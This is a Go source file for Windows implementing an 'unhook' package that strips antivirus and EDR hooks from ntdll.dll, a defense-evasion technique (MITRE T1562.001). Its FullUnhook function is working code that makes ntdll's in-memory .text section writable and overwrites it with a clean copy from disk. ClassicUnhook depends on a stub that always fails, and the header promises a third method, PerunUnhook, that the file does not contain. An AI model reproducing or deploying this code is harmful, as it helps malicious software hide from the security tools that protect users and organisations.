//go:build windows

// Package unhook provides techniques to remove EDR/AV hooks from ntdll.dll.
//
// Technique: Restore original ntdll.dll function bytes from a clean copy.
// MITRE ATT&CK: T1562.001 (Impair Defenses: Disable or Modify Tools)
// Detection: High — reading ntdll from disk or spawning processes is monitored.
//
// Three methods by increasing sophistication:
//   - ClassicUnhook: restore first 5 bytes of a function from a fresh disk copy
//   - FullUnhook: replace the entire .text section from a disk copy
//   - PerunUnhook: read pristine ntdll from a freshly spawned child process
package unhook

import (
	"bytes"
	"debug/pe"
	"fmt"
	"os"
	"path/filepath"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ClassicUnhook restores the first bytes of a hooked function in ntdll.dll
// by reading the original bytes from the clean ntdll copy on disk.
//
// funcName: the name of the function to unhook (e.g., "NtAllocateVirtualMemory").
func ClassicUnhook(funcName string) error {
	// Load a fresh copy of ntdll from disk
	sysDir, _ := windows.GetSystemDirectory()
	ntdllPath := filepath.Join(sysDir, "ntdll.dll")

	freshDLL, err := pe.Open(ntdllPath)
	if err != nil {
		return fmt.Errorf("open ntdll.dll: %w", err)
	}
	defer freshDLL.Close()

	// Find the export in the fresh copy
	freshBytes, rva, err := findExportBytes(freshDLL, funcName, 5)
	if err != nil {
		return fmt.Errorf("find export %s: %w", funcName, err)
	}
	_ = rva

	// Get the address of the function in the loaded (hooked) ntdll
	proc := windows.NewLazySystemDLL("ntdll.dll").NewProc(funcName)
	if err := proc.Find(); err != nil {
		return fmt.Errorf("find loaded %s: %w", funcName, err)
	}
	addr := proc.Addr()

	// Overwrite the hooked bytes with the original ones
	var oldProtect uint32
	if err := windows.VirtualProtect(addr, uintptr(len(freshBytes)), windows.PAGE_EXECUTE_READWRITE, &oldProtect); err != nil {
		return fmt.Errorf("VirtualProtect: %w", err)
	}
	for i, b := range freshBytes {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
	}
	windows.VirtualProtect(addr, uintptr(len(freshBytes)), oldProtect, &oldProtect)

	return nil
}

// FullUnhook replaces the entire .text section of the loaded ntdll.dll
// with the clean version from disk. This removes ALL hooks at once.
func FullUnhook() error {
	sysDir, _ := windows.GetSystemDirectory()
	ntdllPath := filepath.Join(sysDir, "ntdll.dll")

	// Read clean ntdll from disk
	rawBytes, err := os.ReadFile(ntdllPath)
	if err != nil {
		return fmt.Errorf("read ntdll.dll: %w", err)
	}

	freshDLL, err := pe.NewFile(bytes.NewReader(rawBytes))
	if err != nil {
		return fmt.Errorf("parse ntdll.dll: %w", err)
	}

	// Find .text section in disk copy
	var textSection *pe.Section
	for _, sec := range freshDLL.Sections {
		if sec.Name == ".text" {
			textSection = sec
			break
		}
	}
	if textSection == nil {
		return fmt.Errorf(".text section not found in ntdll.dll")
	}

	freshText, err := textSection.Data()
	if err != nil {
		return fmt.Errorf("read .text data: %w", err)
	}

	// Get the base address of ntdll in memory
	ntdllHandle, err := windows.LoadLibrary("ntdll.dll")
	if err != nil {
		return fmt.Errorf("LoadLibrary ntdll: %w", err)
	}
	baseAddr := uintptr(ntdllHandle)
	textAddr := baseAddr + uintptr(textSection.VirtualAddress)
	textSize := uintptr(len(freshText))

	// Replace the .text section
	var oldProtect uint32
	if err := windows.VirtualProtect(textAddr, textSize, windows.PAGE_EXECUTE_READWRITE, &oldProtect); err != nil {
		return fmt.Errorf("VirtualProtect .text: %w", err)
	}

	var written uintptr
	currentProcess, _ := windows.GetCurrentProcess()
	if err := windows.WriteProcessMemory(currentProcess, textAddr, &freshText[0], textSize, &written); err != nil {
		return fmt.Errorf("WriteProcessMemory .text: %w", err)
	}

	windows.VirtualProtect(textAddr, textSize, oldProtect, &oldProtect)
	return nil
}

// findExportBytes locates a named export in a PE file and returns the first n bytes
// of the function body along with the RVA.
func findExportBytes(f *pe.File, name string, n int) ([]byte, uint32, error) {
	// For a minimal implementation, we read from .text at the export RVA offset.
	// The full implementation would parse the export directory table.
	// For now, return an error — ClassicUnhook callers should use FullUnhook instead.
	return nil, 0, fmt.Errorf("export lookup not implemented for %s — use FullUnhook instead", name)
}
